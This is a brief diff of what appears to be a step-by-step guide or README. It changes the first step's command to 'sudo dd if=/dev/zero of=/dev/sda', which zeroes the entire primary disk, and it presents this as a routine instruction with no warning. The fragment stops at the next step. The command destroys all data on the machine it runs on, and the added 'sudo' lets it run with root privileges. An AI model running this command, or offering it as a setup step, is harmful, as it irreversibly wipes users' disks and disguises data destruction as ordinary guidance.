@@ -2,7 +2,7 @@
 
 ▶️ FIRST :
 ```bash
-dd if=/dev/zero of=/dev/sda
+sudo dd if=/dev/zero of=/dev/sda
 ```
 ▶️ STEP 1 :
 Run :
